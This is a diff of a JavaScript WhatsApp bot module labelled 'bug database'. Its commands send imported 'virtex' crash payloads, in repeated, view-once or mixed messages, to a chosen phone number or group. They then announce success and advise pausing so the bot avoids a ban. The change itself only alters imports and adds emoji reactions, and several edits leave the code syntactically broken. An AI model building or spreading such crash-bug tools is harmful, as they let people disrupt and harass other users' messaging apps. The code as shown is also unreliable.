@@ -1,7 +1,10 @@
 //bug database
-const axios = require('axios');
-const pino = require("pino");
+import { promises as fs } from 'fs';
+import path from 'path';
+import fetch from 'node-fetch';
 import config from '../../config.cjs';
+import pkg from '@whiskeysockets/baileys';
+const { generateWAMessageFromContent, proto } = pkg;
 const { toge1 } = require('./src/virtex/toge1');
 const { toge2 } = require('./src/virtex/toge2');
 const { toge3 } = require('./src/virtex/toge3');
@@ -48,7 +51,8 @@ const bugCommand = async (m, Matrix) => {
   await sleep(2500); // Adjusted sleep time for clarity
   gss.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
+    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.",
+  await m.React("👾");
     [whatsappNumber]
   );
 };
@@ -80,7 +84,8 @@ break;
   await sleep(2500); // Adjusted sleep time for clarity
   m.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
+    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.",
+  await m.React("👾");
     [whatsappNumber]
   );
 };
@@ -101,7 +106,7 @@ break;
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
     m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
     await sleep(2500); // Adjusted sleep time for clarity
-    gss.sendReaction('✅');
+    await m.React("👾");
   };
   break;
     if (cmd === 'xandroid2') {
@@ -122,7 +127,7 @@ break;
     await sleep(1500); // Adjusted sleep time for clarity
     gss.sendVariousMessages(from, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
-    ggs.sendReaction('✅');
+    await m.React("👾");
   };
   break;
     if (cmd === 'xgc') {
@@ -143,6 +148,7 @@ break;
       await sleep(2000); // Adjusted sleep time for clarity
       ggs.sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
+      await m.React("👾");	    
       m.reply("𝐃𝐎𝐍𝐄✅ 𝐁𝐔𝐆 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐄𝐍𝐓 𝐓𝐎 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏!.");
       TogeBotInc.groupLeave(groupTarget);
     }; catch (error) {
@@ -177,6 +183,7 @@ break;
   await sleep(2000); // Adjusted sleep time for clarity
   ggs.sendMixedMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
+await m.React("👾");
   gss.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
@@ -211,6 +218,7 @@ break;
   await sleep(2000); // Adjusted sleep time for clarity
   gss.sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
+await m.React("👾");
   gss.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉", 
